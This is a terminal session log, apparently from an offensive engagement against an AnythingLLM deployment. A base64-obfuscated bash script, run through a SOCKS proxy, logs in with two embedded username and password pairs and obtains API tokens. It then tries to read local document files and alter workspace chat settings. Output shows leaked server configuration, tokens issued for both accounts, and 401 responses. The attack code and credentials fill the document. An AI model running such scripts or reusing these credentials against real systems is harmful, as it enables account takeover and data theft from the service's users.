@@ -1,0 +1,53 @@
+└─$ └─$ 
+
+┌──(cinder@kali)-[~]
+└─$ └─$ base64 -d > /tmp/w01cj.sh <<'B64EOF'
+> IyEvYmluL2Jhc2gKUD0iLS1zb2NrczUtaG9zdG5hbWUgMTI3LjAuMC4xOjEwODAiCkE9aHR0cHM6Ly9hc3Npc3RhbnQua2VwbGVyb3BzLnRlc3QKZWNobyAiIyMjIHNldHVwLWNvbXBsZXRlIjsgY3VybCAtc1MgJFAgLS1jYWNlcnQgL3RtcC9jYS5jcnQgLS1tYXgtdGltZSAxNSAiJEEvYXBpL3NldHVwLWNvbXBsZXRlIiB8IGhlYWQgLWMgMjUwMDsgZWNobwpmb3IgVSBpbiAicm93YW4uaXRvOmZrX2RldmVsb3Blcl95VVdUS1NxcmMxNnkzSzVfNURmUTdxYWNmdDliLTl4byIgIm1heWEucmFuc2NvbWJlOnNXUWEzMTA4NUZUUWVrWmhIVHhVeWZfOUUxbWFycTB1cjhXTkNLbVR0bmsiOyBkbwogdW49JHtVJSU6Kn07IHB3PSR7VSMqOn0KIFRPSz0kKGN1cmwgLXNTICRQIC0tY2FjZXJ0IC90bXAvY2EuY3J0IC0tbWF4LXRpbWUgMTUgLVggUE9TVCAtSCAnQ29udGVudC1UeXBlOiBhcHBsaWNhdGlvbi9qc29uJyAtZCAie1widXNlcm5hbWVcIjpcIiR1blwiLFwicGFzc3dvcmRcIjpcIiRwd1wifSIgIiRBL2FwaS9yZXF1ZXN0LXRva2VuIiB8IHB5dGhvbjMgLWMgJ2ltcG9ydCBqc29uLHN5cztwcmludChqc29uLmxvYWQoc3lzLnN0ZGluKS5nZXQoInRva2VuIiwiIikpJykKIGVjaG8gIiMjIyMjICR1biB0b2tlbmxlbj0keyNUT0t9IgogSD0iQXV0aG9yaXphdGlvbjogQmVhcmVyICRUT0siCiBlY2hvICItLSBieS1kb2NwYXRocyIKIGN1cmwgLXNTICRQIC0tY2FjZXJ0IC90bXAvY2EuY3J0IC0tbWF4LXRpbWUgMjAgLUggIiRIIiAtSCAnQ29udGVudC1UeXBlOiBhcHBsaWNhdGlvbi9qc29uJyAtZCAneyJkb2NwYXRocyI6WyJjdXN0b20tZG9jdW1lbnRzL2NvbXBhbnktaGlzdG9yeS5tZC0zMDQ3NTMzMy00ZDVhLTRmOTktYWNhNi02NDkyNDYzMTAxY2YuanNvbiJdfScgIiRBL2FwaS9zeXN0ZW0vbG9jYWwtZmlsZXMvYnktZG9jcGF0aHMiIC13ICdcbmNvZGU9JXtodHRwX2NvZGV9XG4nIHwgaGVhZCAtYyAxNTAwOyBlY2hvCiBlY2hvICItLSBjaGF0LXNldHRpbmdzIgogY3VybCAtc1MgJFAgLS1jYWNlcnQgL3RtcC9jYS5jcnQgLS1tYXgtdGltZSAyMCAtSCAiJEgiIC1IICdDb250ZW50LVR5cGU6IGFwcGxpY2F0aW9uL2pzb24nIC1YIFBPU1QgLWQgJ3siY2hhdE1vZGUiOiJxdWVyeSJ9JyAiJEEvYXBpL3dvcmtzcGFjZS9maWVsZGxpbmstb3BlcmF0aW9ucy9zZXR0aW5ncy9jaGF0LXNldHRpbmdzIiAtdyAnXG5jb2RlPSV7aHR0cF9jb2RlfVxuJyB8IGhlYWQgLWMgODAwOyBlY2hvCmRvbmUK
+> B64EOF
+
+┌──(cinder@kali)-[~]
+└─$ └─$ chmod +x /tmp/w01cj.sh; bash /tmp/w01cj.sh; echo DONEMARK_1795205647339$((6*7))
+### setup-complete
+{"results":{"RequiresAuth":true,"AuthToken":true,"JWTSecret":true,"StorageDir":"/app/server/storage","MultiUserMode":true,"MemoryEnabled":false,"MemoryAutoExtraction":true,"DisableTelemetry":"true","EmbeddingEngine":"native","HasExistingEmbeddings":true,"HasCachedEmbeddings":true,"EmbeddingModelPref":"Xenova/all-MiniLM-L6-v2","EmbeddingOutputDimensions":null,"OllamaEmbeddingBatchSize":1,"VoyageAiApiKey":false,"GenericOpenAiEmbeddingApiKey":false,"GenericOpenAiEmbeddingMaxConcurrentChunks":500,"GeminiEmbeddingApiKey":false,"GenericOpenAiEmbeddingPassagePrefix":"","GenericOpenAiEmbeddingQueryPrefix":"","ImageGenerationProvider":null,"ImageGenerationModelPref":null,"ImageGenerationDimensions":"512x512","ImageGenerationOpenAiKey":false,"ImageGenerationOpenRouterApiKey":false,"ImageGenerationOllamaAuthToken":false,"ImageGenerationLemonadeApiKey":false,"ImageGenerationLocalAiApiKey":false,"ImageGenerationLlmmanAuthToken":false,"ImageGenerationGeminiApiKey":false,"VectorDB":"lancedb","PineConeKey":false,"ChromaApiKey":false,"ChromaCloudApiKey":false,"WeaviateApiKey":false,"QdrantApiKey":false,"MilvusPassword":false,"ZillizApiToken":false,"AstraDBApplicationToken":false,"PGVectorConnectionString":false,"PGVectorTableName":"anythingllm_vectors","LLMProvider":"ollama","LLMModel":"fieldlink-qwen:latest","ModelRouterId":null,"OpenAiKey":false,"OpenAiModelPref":"gpt-4.1-nano","AzureOpenAiKey":false,"AzureOpenAiTokenLimit":4096,"AzureOpenAiModelType":"default","AnthropicApiKey":false,"AnthropicModelPref":"claude-sonnet-4-6","AnthropicCacheControl":"none","GeminiLLMApiKey":false,"GeminiLLMModelPref":"gemini-2.0-flash-lite","GeminiSafetySetting":"BLOCK_MEDIUM_AND_ABOVE","LMStudioTokenLimit":null,"LMStudioAuthToken":false,"LocalAiApiKey":false,"OllamaLLMAuthToken":false,"OllamaLLMBasePath":"http://fieldlink-ollama:11434","OllamaLLMModelPref":"fieldlink-qwen:latest","OllamaLLMTokenLimit":"4096","OllamaLLMKeepAliveSeconds":300,"NovitaLLMApiKey":false,"TogetherAiApiKey":false,"FireworksAiLLMApiKey":false,"PerplexityApiKey":false,"OpenRouterApiKey":false,"MistralApiKey":false,"GroqApiKey":false,"TextGenWebUIAPIKey":false,"LiteLLMApiKey":false,"MoonshotAiApiKey":false,"MoonshotAiModelPref":"moonshot-v1-32k","GenericOpenAiKey":false,"AwsBedrockLLMApiKey":false,"AwsBedrockLLMTokenLimit":8192,"AwsBedrockLLMMaxTokens":4096,"CohereApiKey":false,"DeepSeekApiKey":false,"ApipieLLMApiKey":false,"XAIApiKey":false,"PPIOApiKey":false,"CometApiLLMApiKey":false,"ZAiApiKey":false,"GiteeAIApiK
+##### rowan.ito tokenlen=168
+-- by-docpaths
+Unauthorized
+code=401
+
+-- chat-settings
+
+       <!DOCTYPE html>
+        <html lang="en">
+          <head>
+            <meta charset="UTF-8" />
+            <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+            <link type="image/svg+xml" href="/favicon.png" >
+<title >AnythingLLM | Your personal LLM trained on anything</title>
+<meta name="title" content="AnythingLLM | Your personal LLM trained on anything" >
+<meta description="title" content="AnythingLLM | Your personal LLM trained on anything" >
+<meta property="og:type" content="website" >
+<meta property="og:url" content="https://anythingllm.com" >
+<meta property="og:title" content="AnythingLLM | Your personal LLM trained on anything" >
+<meta property="og:description" content="AnythingLLM | Your personal LLM trained on anything" >
+<meta property="og:
+##### maya.ranscombe tokenlen=175
+-- by-docpaths
+Unauthorized
+code=401
+
+-- chat-settings
+
+       <!DOCTYPE html>
+        <html lang="en">
+          <head>
+            <meta charset="UTF-8" />
+            <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+            <link type="image/svg+xml" href="/favicon.png" >
+<title >AnythingLLM | Your personal LLM trained on anything</title>
+<meta name="title" content="AnythingLLM | Your personal LLM trained on anything" >
+<meta description="title" content="AnythingLLM | Your personal LLM trained on anything" >
+<meta property="og:type" content="website" >
+<meta property="og:url" content="https://anythingllm.com" >
+<meta property="og:title" content="AnythingLLM | Your personal LLM trained on anything" >
+<meta property="og:description" content="AnythingLLM | Your personal LLM trained on anything" >
+<meta property="og:
